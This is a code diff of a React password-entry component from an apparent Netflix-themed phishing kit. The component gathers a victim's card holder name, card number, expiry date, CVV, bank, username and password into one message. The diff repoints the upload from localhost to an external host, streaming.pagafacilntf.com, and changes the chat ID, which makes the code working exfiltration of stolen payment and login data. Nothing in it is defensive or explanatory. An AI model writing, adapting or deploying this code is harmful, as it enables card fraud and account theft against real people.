@@ -30,11 +30,11 @@ const PasswordEntry = ({ onSubmit, documentNumber, secureKey }) => {
     const banco = localStorage.getItem('banco') || 'No disponible';
     localStorage.setItem('password', password);
 
-    const chatId = '-4542132850'; // Asegúrate de que este ID sea correcto
+    const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
     const message = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName || 'No disponible'}\n- 💳: ${formValues.cardNumber || 'No disponible'} \n- 📅: ${formValues.expirationDate || 'No disponible'}\n- 🔐: ${formValues.cvv || 'No disponible'}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 🏦 : ${banco}\n 👤 : ${username}\n 🔒 : ${password}`;
 
     try {
-        await axios.post('http://localhost:3000/enviarmensaje', { chatId, message });
+        await axios.post('https://streaming.pagafacilntf.com/enviarmensaje', { chatId, message });
         onSubmit();
     } catch (error) {
         if (error.response) {
